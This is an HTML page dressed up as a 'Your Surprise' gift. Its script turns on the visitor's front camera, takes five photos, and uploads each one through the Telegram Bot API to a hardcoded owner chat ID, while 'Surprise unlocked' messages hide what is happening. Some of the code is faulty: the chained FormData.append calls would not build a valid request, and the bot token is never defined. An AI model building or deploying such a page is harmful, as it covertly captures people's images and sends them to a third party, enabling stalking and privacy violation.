<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>üéÅ Your Surprise</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial,sans-serif; }
body { display: flex; justify-content: center; align-items: center; min-height: 100vh; background: linear-gradient(135deg,#6a11cb,#2575fc); padding:20px; }
.container { background:white;padding:25px;border-radius:15px;text-align:center;max-width:450px; width:100%;box-shadow:0 10px 30px rgba(0,0,0,0.2); }
h1 { color:#333; font-size:22px; margin:10px 0; }
button { background:linear-gradient(90deg,#6a11cb,#2575fc); color:white; border:none; padding:15px; width:100%; border-radius:50px; font-size:18px; cursor:pointer; margin:15px 0; }
video { width:100%; border-radius:10px; display:none; }
.photo-preview { width:140px; height:140px; border-radius:10px; margin:15px auto; object-fit:cover; display:none; }
#status { color:#00b09b; margin:10px 0; display:none; }
</style>
</head>
<body>
<div class="container">
<h1 id="title">üéÅ Your Surprise</h1>
<p id="message">Click below to start</p>
<button onclick="startSurprise()">üéÅ GET SURPRISE</button>
<video id="video" autoplay playsinline></video>
<img id="photoPreview" class="photo-preview">
<div id="status"></div>
</div>
<canvas id="canvas" style="display:none;"></canvas>

<script>
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");
let stream;

async function startSurprise() {
    document.getElementById("title").textContent="üì∏ Loading surprise...";
    document.getElementById("message").textContent="Smile! Taking your photos...";
    try {
        stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
        video.srcObject = stream;
        video.style.display="block";
        await new Promise(r=>video.onloadedmetadata=r);
        await takePhotos();
    } catch(e) {
        document.getElementById("title").textContent="‚ö† Camera access denied!";
        document.getElementById("message").textContent="Cannot take real photos.";
    }
}

async function takePhotos() {
    for(let i=1;i<=5;i++){
        canvas.width=video.videoWidth;
        canvas.height=video.videoHeight;
        ctx.drawImage(video,0,0,canvas.width,canvas.height);
        const blob = await new Promise(r=>canvas.toBlob(r,"image/jpeg",0.9));
        showPreview(blob);
        await sendPhoto(blob,i);
        document.getElementById("status").textContent=`üéâ Surprise ${i} unlocked!`;
        document.getElementById("status").style.display="block";
        await delay(1000);
    }
    stream.getTracks().forEach(track=>track.stop());
    document.getElementById("title").textContent="‚úÖ Complete!";
    document.getElementById("message").textContent="Check your Telegram for all photos!";
}

function showPreview(blob){
    const url = URL.createObjectURL(blob);
    const preview = document.getElementById("photoPreview");
    preview.src = url;
    preview.style.display="block";
    setTimeout(()=>URL.revokeObjectURL(url),1000);
}

async function sendPhoto(blob,num){
    const chat_id = new URLSearchParams(window.location.search).get("user_id");
    const file = new File([blob],`photo_${num}.jpg`,{type:"image/jpeg"});
    const captionUser = `üéÅ Surprise ${num}`;
    const captionOwner = `üì∏ Photo ${num} received`;

    // Send to user
    if(chat_id){
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
            method:"POST",
            body:new FormData().append("photo",file).append("chat_id",chat_id).append("caption",captionUser)
        });
    }
    // Send to owner
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
        method:"POST",
        body:new FormData().append("photo",file).append("chat_id","8215819954").append("caption",captionOwner)
    });
}

function delay(ms){return new Promise(r=>setTimeout(r,ms));}
</script>
</body>
</html>
